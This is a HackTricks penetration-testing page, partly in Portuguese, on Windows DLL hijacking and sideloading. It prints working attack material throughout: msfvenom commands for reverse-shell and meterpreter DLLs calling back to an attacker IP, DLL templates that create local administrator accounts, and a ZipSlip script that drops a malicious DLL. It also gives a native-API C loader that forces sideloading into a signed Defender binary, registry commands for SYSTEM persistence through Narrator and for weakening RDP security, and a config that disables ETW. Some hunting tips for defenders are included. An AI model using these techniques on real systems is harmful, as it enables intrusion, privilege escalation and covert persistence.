# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking envolve manipular uma aplicação confiável para carregar uma DLL maliciosa. Esse termo abrange várias táticas como **DLL Spoofing, Injection, and Side-Loading**. É usado principalmente para code execution, alcançar persistence e, com menos frequência, privilege escalation. Apesar do foco na escalation aqui, o método de hijacking permanece consistente entre os objetivos.

### Common Techniques

Vários métodos são empregados para DLL hijacking, cada um com sua eficácia dependendo da estratégia de carregamento de DLL da aplicação:

1. **DLL Replacement**: Trocar uma DLL legítima por uma maliciosa, opcionalmente usando DLL Proxying para preservar a funcionalidade da DLL original.
2. **DLL Search Order Hijacking**: Colocar a DLL maliciosa em um caminho de busca antes da legítima, explorando o padrão de busca da aplicação.
3. **Phantom DLL Hijacking**: Criar uma DLL maliciosa para uma aplicação carregar, pensando que ela é uma DLL necessária inexistente.
4. **DLL Redirection**: Modificar parâmetros de busca como `%PATH%` ou arquivos `.exe.manifest` / `.exe.local` para direcionar a aplicação para a DLL maliciosa.
5. **WinSxS DLL Replacement**: Substituir a DLL legítima por uma contraparte maliciosa no diretório WinSxS, um método frequentemente associado a DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar a DLL maliciosa em um diretório controlado pelo usuário junto com a aplicação copiada, semelhante a técnicas de Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading is not the only way to make a trusted **.NET Framework** process load attacker code. If the target executable is a **managed** application, the CLR also consults an **application configuration file** named after the executable (for example `Setup.exe.config`). That file can define a custom **AppDomainManager**. If the config points to an attacker-controlled assembly placed next to the EXE, the CLR loads it **before the application's normal code path** and runs inside the trusted process.

Per Microsoft's .NET Framework configuration schema, both `<appDomainManagerAssembly>` and `<appDomainManagerType>` must be present for the custom manager to be used.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Gerenciador mínimo:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Notas práticas:
- Isto é tradecraft específico de **.NET Framework**. Depende do parsing de config do CLR, não da ordem de busca de DLL do Win32.
- O host precisa realmente ser um **managed EXE**. Triagem rápida: `sigcheck -m target.exe`, `corflags target.exe`, ou verifique o **CLR Runtime Header** nos metadados PE.
- O nome do arquivo de config deve corresponder exatamente ao nome do executável (`<binary>.config`) e normalmente fica **ao lado do EXE**.
- Isso é útil com **signed Microsoft/vendor binaries** porque o EXE confiável permanece intocado enquanto o assembly managed malicioso executa in-process.
- Se você já tem um diretório de instalação/update gravável, o AppDomainManager hijacking pode ser usado como **primeiro estágio**, seguido por classic DLL sideloading ou reflective loading para estágios posteriores.

### Hijacking an existing scheduled task to relaunch the sideload chain

Para persistence, não procure apenas por **criar uma nova task**. Alguns intrusion sets esperam até que um instalador legítimo crie uma **normal updater task** e então **reescrevem a ação da task** para que o nome, autor e trigger existentes permaneçam familiares aos defenders.

Workflow reutilizável:
1. Instale/execute o software legítimo e identifique a task que ele normalmente cria.
2. Exporte o XML da task e anote os valores atuais de `<Exec><Command>` / `<Arguments>`.
3. Substitua apenas a action para que a task inicie o seu **trusted host EXE** a partir de um diretório de staging gravável pelo usuário, que então faz side-load ou AppDomain-load do payload real.
4. Re-registre o mesmo nome de task em vez de criar um novo artifact óbvio de persistence.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Por que é mais stealthy:
- O nome da task ainda pode parecer legítimo (por exemplo, um updater de vendor).
- O **Task Scheduler service** a executa, então a validação de parent/ancestor muitas vezes vê a cadeia de agendamento esperada em vez de `explorer.exe`.
- Equipes de DFIR que só caçam **novos nomes de task** podem perder uma task cuja registration já existia, mas cuja action agora aponta para `%LOCALAPPDATA%`, `%APPDATA%`, ou outro path controlado pelo attacker.

Fast hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Compare `C:\Windows\System32\Tasks\*` XML and `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata against a baseline.
- Alert when a **vendor-looking updater task** executes from **user-writable directories** or launches a .NET EXE with a colocated `*.config` file.

> [!TIP]
> For a step-by-step chain that layers HTML staging, AES-CTR configs, and .NET implants on top of DLL sideloading, review the workflow below.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

A forma mais comum de encontrar missing Dlls dentro de um sistema é executar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) da sysinternals, **configurando** os **2 filtros a seguir**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

e mostrando apenas a **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Se você estiver procurando **missing dlls em geral**, deixe isso rodando por alguns **segundos**.\
Se você estiver procurando uma **missing dll dentro de um executável específico**, você deve definir **outro filtro como "Process Name" "contains" `<exec name>`, executá-lo e parar de capturar eventos**.

## Exploiting Missing Dlls

Para elevar privilégios, a melhor chance que temos é conseguir **escrever uma dll que um processo privilegiado tentará carregar** em algum **lugar onde ela será procurada**. Portanto, poderemos **escrever** uma dll em uma **pasta** onde a **dll é procurada antes** da pasta onde a **dll original** está (caso estranho), ou poderemos **escrever em alguma pasta onde a dll será procurada** e a **dll original** não existe em nenhuma pasta.

### Dll Search Order

**Dentro da** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **você pode encontrar como as Dlls são carregadas especificamente.**

**Windows applications** procuram DLLs seguindo um conjunto de **pre-defined search paths**, obedecendo a uma sequência específica. O problema do DLL hijacking surge quando uma DLL maliciosa é colocada estrategicamente em um desses diretórios, garantindo que ela seja carregada antes da DLL legítima. Uma solução para evitar isso é garantir que a application use absolute paths ao referenciar as DLLs de que precisa.

Você pode ver a **DLL search order on 32-bit** systems abaixo:

1. O diretório de onde a application foi carregada.
2. O system directory. Use a função [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obter o path deste diretório.(_C:\Windows\System32_)
3. O 16-bit system directory. Não existe uma função que obtenha o path deste diretório, mas ele é pesquisado. (_C:\Windows\System_)
4. O Windows directory. Use a função [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obter o path deste diretório.
1. (_C:\Windows_)
5. O current directory.
6. Os directories listados na variável de ambiente PATH. Note que isso não inclui o per-application path especificado pela chave de registro **App Paths**. A chave **App Paths** não é usada ao calcular o DLL search path.

Essa é a search order **default** com **SafeDllSearchMode** habilitado. Quando ele está desabilitado, o current directory sobe para o segundo lugar. Para desabilitar esse recurso, crie o valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e defina-o como 0 (o padrão é habilitado).

Se a função [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) for chamada com **LOAD_WITH_ALTERED_SEARCH_PATH**, a busca começa no diretório do módulo executável que **LoadLibraryEx** está carregando.

Por fim, note que **uma dll pode ser carregada indicando o absolute path em vez de apenas o nome**. Nesse caso, essa dll **só será procurada naquele path** (se a dll tiver dependências, elas serão procuradas como se tivessem sido carregadas por nome).

Existem outras formas de alterar o search order, mas não vou explicá-las aqui.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Use filtros do **ProcMon** (`Process Name` = target EXE, `Path` termina com `.dll`, `Result` = `NAME NOT FOUND`) para coletar nomes de DLL que o process consulta mas não encontra.
2. Se o binary roda por **schedule/service**, dropar uma DLL com um desses nomes no **application directory** (entrada #1 da search order) será carregado na próxima execução. Em um caso de scanner .NET, o process procurou por `hostfxr.dll` em `C:\samples\app\` antes de carregar a cópia real de `C:\Program Files\dotnet\fxr\...`.
3. Construa uma payload DLL (por exemplo, reverse shell) com qualquer export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Se sua primitive for um **ZipSlip-style arbitrary write**, crie um ZIP cuja entry escape do extraction dir para que a DLL caia na pasta da app:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Entregue o archive para a watched inbox/share; quando a scheduled task relançar o processo, ele carrega a malicious DLL e executa seu code como a service account.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Uma forma avançada de influenciar de maneira determinística o DLL search path de um novo processo é definir o campo DllPath em RTL_USER_PROCESS_PARAMETERS ao criar o processo com as native APIs do ntdll. Ao fornecer um diretório controlado pelo attacker aqui, um target process que resolva uma imported DLL por name (sem absolute path e sem usar as safe loading flags) pode ser forçado a carregar uma malicious DLL a partir desse diretório.

Key idea
- Build the process parameters com RtlCreateProcessParametersEx e forneça um custom DllPath que aponte para sua controlled folder (por exemplo, o diretório onde seu dropper/unpacker está).
- Crie o processo com RtlCreateUserProcess. Quando o target binary resolver uma DLL por name, o loader consultará este DllPath fornecido durante a resolução, permitindo sideloading confiável mesmo quando a malicious DLL não estiver no mesmo local do target EXE.

Notes/limitations
- Isso afeta o child process que está sendo criado; é diferente de SetDllDirectory, que afeta apenas o current process.
- O target deve importar ou LoadLibrary uma DLL por name (sem absolute path e sem usar LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e hardcoded absolute paths não podem ser hijacked. Forwarded exports e SxS podem alterar a precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Exemplo de uso operacional
- Coloque uma xmllite.dll maliciosa (exportando as funções necessárias ou fazendo proxy para a real) no seu diretório DllPath.
- Inicie um binário assinado conhecido por procurar xmllite.dll pelo nome usando a técnica acima. O loader resolve o import via o DllPath fornecido e faz sideload da sua DLL.

Esta técnica foi observada em operações reais para conduzir cadeias de sideloading em múltiplas etapas: um launcher inicial solta uma DLL auxiliar, que então inicia um binário da Microsoft assinado, passível de hijack, com um DllPath customizado para forçar o carregamento da DLL do atacante a partir de um diretório de staging.


### .NET AppDomainManager hijacking via `.exe.config`

Para alvos **.NET Framework**, o sideloading pode ser feito **antes de `Main()`** sem patching de memory, abusando do arquivo adjacente **`.exe.config`** da aplicação. Em vez de depender apenas da ordem de busca de DLLs do Win32, o atacante coloca um EXE legítimo .NET ao lado de um config malicioso e um ou mais assemblies controlados pelo atacante.

Como a cadeia funciona:
1. O EXE host inicia e o **CLR lê `<exe>.config`**.
2. O config define **`<appDomainManagerAssembly>`** e **`<appDomainManagerType>`** para que o runtime instancie um `AppDomainManager` controlado pelo atacante.
3. O manager malicioso obtém execução **pré-`Main()`** dentro do processo host confiável.
4. O mesmo config pode forçar o CLR a resolver primeiro os assemblies locais (por exemplo `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) e pode enfraquecer a validação/telemetria do runtime sem patching inline.

Padrão estilo campanha (o nesting exato pode variar conforme a directive / versão do CLR):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Why this is useful:
- **`<probing privatePath="."/>`** keeps assembly resolution in the application directory, turning the folder into a predictable sideloading surface.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** move execution into attacker code during CLR initialization, before the legitimate app logic runs.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** can let a full-trust app load unsigned or tampered assemblies without a strong-name validation failure.
- **`<publisherPolicy apply="no"/>`** avoids publisher-policy redirects to newer assemblies.
- **`<requiredRuntime ... safemode="true"/>`** makes runtime selection more deterministic.
- **`<etwEnable enabled="false"/>`** is especially interesting because the **CLR disables its own ETW visibility** from configuration instead of the implant patching `EtwEventWrite` in memory.

Operational pattern seen in recent campaigns:
- Stage 1 drops `setup.exe`, `setup.exe.config`, and local assemblies.
- Stage 2 copies them into a believable **AppData update** folder, renames the host to something like `update.exe`, and relaunches it via a **scheduled task**.
- Stage 3 verifies execution context (for example expected parent `svchost.exe` from Task Scheduler) before loading the final RAT DLL/export.

Hunting ideas:
- Signed or otherwise legitimate **.NET executables** running with suspicious adjacent **`.config`** files in user-writable locations.
- `.config` files containing **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, or **`etwEnable enabled="false"`**.
- Scheduled tasks that relaunch renamed update binaries from **`%LOCALAPPDATA%`** or app-specific `\bin\update\` directories.
- Parent/child chains where a scheduled task launches a trusted .NET host that immediately loads non-vendor assemblies from its own directory.

#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Yeah, the requisites are complicated to find as **by default it's kind of weird to find a privileged executable missing a dll** and it's even **more weird to have write permissions on a system path folder** (you can't by default). But, in misconfigured environments this is possible.\
In the case you are lucky and you find yourself meeting the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **verifique as permissões de todas as pastas dentro do PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Você também pode verificar os imports de um executável e os exports de uma dll com:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para um guia completo sobre como **abuse Dll Hijacking para escalar privilégios** com permissões para escrever em uma pasta do **System Path**, confira:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)verificará se você tem permissões de escrita em qualquer pasta dentro do system PATH.\
Outras ferramentas automatizadas interessantes para descobrir essa vulnerability são as funções do **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Example

Caso você encontre um cenário explorável, uma das coisas mais importantes para explorá-lo com sucesso seria **criar um dll que exporte pelo menos todas as funções que o executable importará dele**. De qualquer forma, observe que Dll Hijacking é útil para [escalar de Medium Integrity level para High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou de[ **High Integrity para SYSTEM**](../index.html#from-high-integrity-to-system)**.** Você pode encontrar um exemplo de **como criar um dll válido** neste estudo sobre dll hijacking focado em execução: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Além disso, na **next section** você pode encontrar alguns **basic dll codes** que podem ser úteis como **templates** ou para criar um **dll com funções não necessárias exportadas**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basicamente, um **Dll proxy** é um Dll capaz de **execute seu código malicioso quando carregado** mas também de **expose** e **work** como **exected** ao encaminhar todas as chamadas para a biblioteca real.

Com a ferramenta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus), você pode realmente **indicar um executable e selecionar a library** que deseja proxificar e **gerar um proxified dll** ou **indicar o Dll** e **gerar um proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenha um meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Criar um usuário (x86, não vi uma versão x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Seu próprio

Note que, em vários casos, o Dll que você compilar deve **exportar várias funções** que serão carregadas pelo processo vítima; se essas funções não existirem, o **binary não conseguirá carregá-las** e o **exploit falhará**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Exemplo de DLL em C++ com criação de usuário</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>C DLL alternativo com thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Estudo de caso: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

O Windows Narrator.exe ainda verifica, na inicialização, uma DLL de localization previsível e específica do idioma, que pode ser hijacked para execução arbitrária de código e persistence.

Fatos principais
- Caminho de probe (builds atuais): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Caminho legada (builds mais antigos): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se existir uma DLL gravável controlada pelo atacante no caminho OneCore, ela é carregada e `DllMain(DLL_PROCESS_ATTACH)` é executado. Nenhum export é necessário.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Inicie o Narrator e observe a tentativa de carregar o caminho acima.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silêncio
- Um hijack ingênuo vai falar/destacar a UI. Para ficar quieto, ao conectar enumere as threads do Narrator, abra a thread principal (`OpenThread(THREAD_SUSPEND_RESUME)`) e use `SuspendThread` nela; continue na sua própria thread. Veja o PoC para o código completo.

Trigger e persistence via configuração de Accessibility
- Contexto de usuário (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Com o acima, iniciar o Narrator carrega a DLL plantada. No secure desktop (tela de logon), pressione CTRL+WIN+ENTER para iniciar o Narrator; sua DLL executa como SYSTEM no secure desktop.

Execução de SYSTEM acionada por RDP (lateral movement)
- Permita a classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Faça RDP para o host; na tela de logon, pressione CTRL+WIN+ENTER para iniciar o Narrator; sua DLL executa como SYSTEM no secure desktop.
- A execução para quando a sessão RDP fecha—injete/migre rapidamente.

Bring Your Own Accessibility (BYOA)
- Você pode clonar uma entrada do registry de uma Built-in Accessibility Tool (AT) (por exemplo, CursorIndicator), editá-la para apontar para um binário/DLL arbitrário, importá-la e depois definir `configuration` para esse nome de AT. Isso faz proxy de execução arbitrária sob o framework de Accessibility.

Notas
- Escrever em `%windir%\System32` e alterar valores HKLM exige privilégios de admin.
- Toda a lógica do payload pode ficar em `DLL_PROCESS_ATTACH`; exports não são necessários.

## Caso de Estudo: CVE-2025-1729 - Privilege Escalation Usando TPQMAssistant.exe

Este caso demonstra **Phantom DLL Hijacking** no TrackPoint Quick Menu da Lenovo (`TPQMAssistant.exe`), rastreado como **CVE-2025-1729**.

### Detalhes da Vulnerabilidade

- **Component**: `TPQMAssistant.exe` localizado em `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` executa diariamente às 9:30 AM no contexto do usuário logado.
- **Directory Permissions**: gravável por `CREATOR OWNER`, permitindo que usuários locais deixem arquivos arbitrários.
- **DLL Search Behavior**: tenta carregar `hostfxr.dll` primeiro do diretório de trabalho e registra "NAME NOT FOUND" se estiver ausente, indicando precedência de busca no diretório local.

### Implementação do Exploit

Um atacante pode colocar um stub malicioso de `hostfxr.dll` no mesmo diretório, explorando a DLL ausente para obter code execution no contexto do usuário:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Como usuário padrão, solte `hostfxr.dll` em `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Aguarde o scheduled task executar às 9:30 AM no contexto do usuário atual.
3. Se um administrator estiver logado quando a tarefa executar, a DLL maliciosa roda na sessão do administrator com medium integrity.
4. Encadeie técnicas padrão de UAC bypass para elevar de medium integrity para privilégios SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors frequentemente combinam dropper baseado em MSI com DLL side-loading para executar payloads sob um processo confiável e assinado.

Chain overview
- O usuário baixa o MSI. Um CustomAction roda silenciosamente durante a instalação GUI (por exemplo, LaunchApplication ou uma ação em VBScript), reconstruindo a próxima stage a partir de recursos embutidos.
- O dropper grava um EXE legítimo e assinado e uma DLL maliciosa no mesmo diretório (exemplo de par: Avast-signed wsc_proxy.exe + wsc.dll controlada pelo attacker).
- Quando o EXE assinado é iniciado, a Windows DLL search order carrega wsc.dll do diretório de trabalho primeiro, executando código do attacker sob um parent assinado (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Procure entradas que executam executables ou VBScript. Exemplo de padrão suspeito: LaunchApplication executando um arquivo embutido em background.
- No Orca (Microsoft Orca.exe), inspecione as tabelas CustomAction, InstallExecuteSequence e Binary.
- Embedded/split payloads no MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ou use lessmsi: lessmsi x package.msi C:\out
- Procure múltiplos fragments pequenos que são concatenados e decrypted por um VBScript CustomAction. Fluxo comum:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Coloque esses dois arquivos na mesma pasta:
- wsc_proxy.exe: host legítimo assinado (Avast). O processo tenta carregar wsc.dll pelo nome a partir do seu diretório.
- wsc.dll: DLL do atacante. Se não forem necessários exports específicos, DllMain pode ser suficiente; caso contrário, crie uma proxy DLL e encaminhe os exports necessários para a biblioteca genuína enquanto executa a payload em DllMain.
- Compile uma payload mínima em DLL:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
